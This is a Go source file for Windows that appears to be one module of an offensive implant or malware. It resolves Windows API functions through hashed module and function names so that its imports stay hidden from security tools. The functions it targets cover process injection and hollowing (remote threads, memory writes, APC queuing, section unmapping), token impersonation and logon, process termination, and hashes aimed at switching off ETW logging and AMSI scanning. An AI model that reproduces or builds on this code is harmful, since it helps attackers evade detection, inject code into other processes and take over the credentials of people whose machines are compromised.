//go:build windows
// +build windows

package main

import (
	"syscall"
)

const (
	mhKernel32 = 0x6ddb9555
	mhAdvapi32 = 0x64bb3129
	mhNtdll    = 0x1edab0ed

	fhCreateRemoteThread           = 0x252b157d
	fhVirtualAlloc                 = 0x097bc257
	fhVirtualProtect               = 0xe857500d
	fhWriteProcessMemory           = 0xb7930ae8
	fhGetComputerName              = 0x8c52da4c
	fhGetUserName                  = 0xfca17e5c
	fhLogonUser                    = 0x5ed5d61a
	fhImpersonateLoggedOnUser      = 0x47ec82fa
	fhRevertToSelf                 = 0x7292758a
	fhOpenProcessToken             = 0xd9f566f7
	fhDuplicateTokenEx             = 0x10ad057e
	fhCreateProcessWithLogon       = 0xe139fc0a
	fhSetProcessMitigationPolicy   = 0x7c028f35
	fhOpenProcess                  = 0x8b21e0b6
	fhTerminateProcess             = 0xf3c179ad
	fhCreateToolhelp32Snapshot     = 0xf37ac035
	fhProcess32First               = 0xb06fa1a8
	fhProcess32Next                = 0x43f6e75f
	fhCloseHandle                  = 0xfdb928e7
	fhGetExitCodeProcess           = 0xa7c5fd39
	fhWaitForSingleObject          = 0x0df1b3da
	fhGetTokenInformation          = 0x10357d2c
	fhQueueUserAPC                 = 0xe5158bdd
	fhResumeThread                 = 0x8dc7e12e
	fhCreateProcessW               = 0xfbaf90cf
	fhGetThreadContext             = 0x6a967222
	fhSetThreadContext             = 0xfd1438ae
	fhReadProcessMemory            = 0x5c3f8699
	fhNtUnmapViewOfSection         = 0x6aa412cd
	fhNtQueryInformationProcess    = 0x8cdc5dc2
	fhNtProtectVirtualMemory       = 0x50e92888
	fhEtwEventWrite                = 0x58defae2
	fhAmsiScanBuffer               = 0xbab3d02e
	fhAmsiDll                      = 0x668e2af9
)

var (
	pCreateRemoteThread             uintptr
	pVirtualAlloc                   uintptr
	pVirtualProtect                 uintptr
	pWriteProcessMemory             uintptr
	pGetComputerName                uintptr
	pGetUserName                    uintptr
	pLogonUser                      uintptr
	pImpersonateLoggedOnUser        uintptr
	pRevertToSelf                   uintptr
	pOpenProcessToken               uintptr
	pDuplicateTokenEx               uintptr
	pCreateProcessWithLogon         uintptr
	pSetProcessMitigationPolicy     uintptr
	pOpenProcess                    uintptr
	pTerminateProcess               uintptr
	pCreateToolhelp32Snapshot       uintptr
	pProcess32First                 uintptr
	pProcess32Next                  uintptr
	pCloseHandle                    uintptr
	pGetExitCodeProcess             uintptr
	pWaitForSingleObject            uintptr
	pGetTokenInformation            uintptr
	pQueueUserAPC                   uintptr
	pResumeThread                   uintptr
	pCreateProcessW                 uintptr
	pGetThreadContext               uintptr
	pSetThreadContext               uintptr
	pReadProcessMemory              uintptr
	pNtUnmapViewOfSection           uintptr
	pNtQueryInformationProcess      uintptr
)

func initAPI() {
	loadHash := func(modHash, fnHash uint32) uintptr {
		addr, err := resolveAPI(modHash, fnHash)
		if err == nil {
			return addr
		}
		return 0
	}

	pCreateRemoteThread             = loadHash(mhKernel32, fhCreateRemoteThread)
	pVirtualAlloc                   = loadHash(mhKernel32, fhVirtualAlloc)
	pVirtualProtect                 = loadHash(mhKernel32, fhVirtualProtect)
	pWriteProcessMemory             = loadHash(mhKernel32, fhWriteProcessMemory)
	pGetComputerName                = loadHash(mhKernel32, fhGetComputerName)
	pGetUserName                    = loadHash(mhAdvapi32, fhGetUserName)
	pLogonUser                      = loadHash(mhAdvapi32, fhLogonUser)
	pImpersonateLoggedOnUser        = loadHash(mhAdvapi32, fhImpersonateLoggedOnUser)
	pRevertToSelf                   = loadHash(mhAdvapi32, fhRevertToSelf)
	pOpenProcessToken               = loadHash(mhAdvapi32, fhOpenProcessToken)
	pDuplicateTokenEx               = loadHash(mhAdvapi32, fhDuplicateTokenEx)
	pCreateProcessWithLogon         = loadHash(mhAdvapi32, fhCreateProcessWithLogon)
	pSetProcessMitigationPolicy     = loadHash(mhKernel32, fhSetProcessMitigationPolicy)
	pOpenProcess                    = loadHash(mhKernel32, fhOpenProcess)
	pTerminateProcess               = loadHash(mhKernel32, fhTerminateProcess)
	pCreateToolhelp32Snapshot       = loadHash(mhKernel32, fhCreateToolhelp32Snapshot)
	pProcess32First                 = loadHash(mhKernel32, fhProcess32First)
	pProcess32Next                  = loadHash(mhKernel32, fhProcess32Next)
	pCloseHandle                    = loadHash(mhKernel32, fhCloseHandle)
	pGetExitCodeProcess             = loadHash(mhKernel32, fhGetExitCodeProcess)
	pWaitForSingleObject            = loadHash(mhKernel32, fhWaitForSingleObject)
	pGetTokenInformation            = loadHash(mhAdvapi32, fhGetTokenInformation)
	pQueueUserAPC                   = loadHash(mhKernel32, fhQueueUserAPC)
	pResumeThread                   = loadHash(mhKernel32, fhResumeThread)
	pCreateProcessW                 = loadHash(mhKernel32, fhCreateProcessW)
	pGetThreadContext               = loadHash(mhKernel32, fhGetThreadContext)
	pSetThreadContext               = loadHash(mhKernel32, fhSetThreadContext)
	pReadProcessMemory              = loadHash(mhKernel32, fhReadProcessMemory)
	pNtUnmapViewOfSection           = loadHash(mhNtdll, fhNtUnmapViewOfSection)
	pNtQueryInformationProcess      = loadHash(mhNtdll, fhNtQueryInformationProcess)
}

func xCloseHandle(h uintptr) {
	syscall.SyscallN(pCloseHandle, h)
}
